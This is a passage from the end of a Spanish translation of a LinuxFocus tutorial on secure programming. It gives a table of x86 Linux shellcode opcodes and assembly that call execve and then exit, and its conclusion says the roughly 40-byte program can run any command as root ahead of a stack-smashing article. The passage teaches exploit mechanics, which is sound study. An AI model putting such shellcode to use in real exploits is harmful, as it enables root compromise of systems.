<td><tt>&lt;subroutine>:</tt></td>
</tr>

<tr>
<td><tt>5e</tt></td>

<td><tt>popl %esi</tt></td>
</tr>

<tr>
<td><tt>89 76 XX</tt></td>

<td><tt>movl %esi,XX(%esi)</tt></td>

<td>XX = posici&oacute;n del primer elemento en el arreglo de argumentos
(i.e. la direcci&oacute;n de la orden). Este offset es igual al n&uacute;mero
de caracteres en la orden, incluido '\0'.</td>
</tr>

<tr>
<td><tt>31 c0</tt></td>

<td><tt>xorl %eax,%eax</tt></td>
</tr>

<tr>
<td><tt>89 46 XX</tt></td>

<td><tt>movb %eax,XX(%esi)</tt></td>

<td>XX = posici&oacute;n del segundo elemento en el arreglo , aqu&iacute;,
conteniendo un valor NULL.</td>
</tr>

<tr>
<td><tt>88 46 XX</tt></td>

<td><tt>movb %al,XX(%esi)</tt></td>

<td>XX = posici&oacute;n del final de la cadena '\0'.</td>
</tr>

<tr>
<td><tt>b0 0b</tt></td>

<td><tt>movb $0xb,%al</tt></td>
</tr>

<tr>
<td><tt>89 f3</tt></td>

<td><tt>movl %esi,%ebx</tt></td>
</tr>

<tr>
<td><tt>8d 4e XX</tt></td>

<td><tt>leal XX(%esi),%ecx</tt></td>

<td>XX = offset para alcanzar el primer elemento en el arreglo de argumentos
y ponerlo en el registro <tt>%ecx</tt>&nbsp;</td>
</tr>

<tr>
<td><tt>8d 56 XX</tt></td>

<td><tt>leal XX(%esi),%edx</tt></td>

<td>XX = offset para alcanzar el segundo elemento en el arreglo de argumentosy
ponerlo en el registro <tt>%edx</tt>&nbsp;</td>
</tr>

<tr>
<td><tt>cd 80</tt></td>

<td><tt>int $0x80</tt></td>
</tr>

<tr>
<td><tt>31 db</tt></td>

<td><tt>xorl %ebx,%ebx</tt></td>
</tr>

<tr>
<td><tt>89 d8</tt></td>

<td><tt>movl %ebx,%eax</tt></td>
</tr>

<tr>
<td><tt>40</tt></td>

<td><tt>incl %eax</tt></td>
</tr>

<tr>
<td><tt>cd 80</tt></td>

<td><tt>int $0x80</tt></td>
</tr>

<tr>
<td><tt>&lt;subroutine_call>:</tt></td>
</tr>

<tr>
<td><tt>e8 XX XX XX XX</tt></td>

<td><tt>call &lt;subroutine></tt></td>

<td>estos 4 bytes corresponden al n&uacute;mero de bytes para alcanzar&lt;subroutine>
(n&uacute;mero negativo, escrito en&nbsp; little endian)</td>
</tr>
</table>

<A NAME="183lfindex20">&nbsp;</A>
<H2>
Conclusi&oacute;n</H2>

Escribimos un programa de aproximadamente 40 bytes y permite correr cualquier
orden externa como root. Nuestros &uacute;ltimos ejemplos muestran algunas
ideas acerca de c&oacute;mo hacer pedazos una pila. En el siguiente art&iacute;culo
habr&aacute;n m&aacute;s detalles de este mecanismo ...



<!-- 2pdaIgnoreStart -->
<A NAME="talkback">&nbsp;</a>
<h2>Formulario de "talkback" para este art&iacute;culo</h2>
Cada art&iacute;culo tiene su propia p&aacute;gina de "talkback". A trav&eacute;s de esa p&aacute;gina puedes enviar un comentario o consultar los comentarios de otros lectores
<center>
<table border="0"  CELLSPACING="2" CELLPADDING="1">
 <tr BGCOLOR="#C2C2C2"><td align=center>
  <table border="3"  CELLSPACING="2" CELLPADDING="1">
   <tr BGCOLOR="#C2C2C2"><td align=center>
    <A href="http://cgi.linuxfocus.org/cgi-bin/lftalkback?anum=183&amp;lang=es"><b>&nbsp;Ir a la p&aacute;gina de "talkback"&nbsp;</b></a>
   </td></tr></table>
</td></tr></table>
</center>

<HR size="2" noshade>
<!-- ARTICLE FOOT -->
<CENTER><TABLE WIDTH="98%">
<TR><TD ALIGN=CENTER BGCOLOR="#9999AA" WIDTH="50%">
<A HREF="../../common/lfteam.html">Contactar con el equipo de LinuFocus</A>
<BR><FONT COLOR="#FFFFFF">&copy; Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier, <a href="../../common/copy.html">FDL</a> <BR><a href="http://www.linuxfocus.org">LinuxFocus.org</a></FONT>
<BR><a href="http://cgi.linuxfocus.org/cgi-bin/lfcomment?lang=es&amp;article=article183.html" target="_TOP">Pinchar aqu&iacute; para informar de alg&uacute;n problema o enviar comentarios a LinuxFocus</A><BR></TD>
<TD BGCOLOR="#9999AA">
<!-- TRANSLATION INFO -->
<font size=2>Informaci&oacute;n sobre la traducci&oacute;n:</font>
<TABLE>
  <tr><td><font size="2">fr --&gt; -- : Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier <small>&lt;pappy(at)users.sourceforge.net, ccb(at)club-internet.fr, grenier(at)nef.esiea.fr&gt;</small></font></td></tr>
  <tr><td><font size="2">fr --&gt; en: Georges Tarbouriech &lt;georges.t(at)linuxfocus.org&gt;</font></td></tr>
  <tr><td><font size="2">en --&gt; es: Victor Manuel Campos Campos  &lt;victor_inmx(at)yahoo.com.mx&gt;</font></td></tr>
</TABLE>
</TD>
</TR></TABLE></CENTER>
<p><font size=1>2002-07-24, generated by lfparser version 2.21</font></p>
<!-- 2pdaIgnoreStop -->
</BODY>
</HTML>
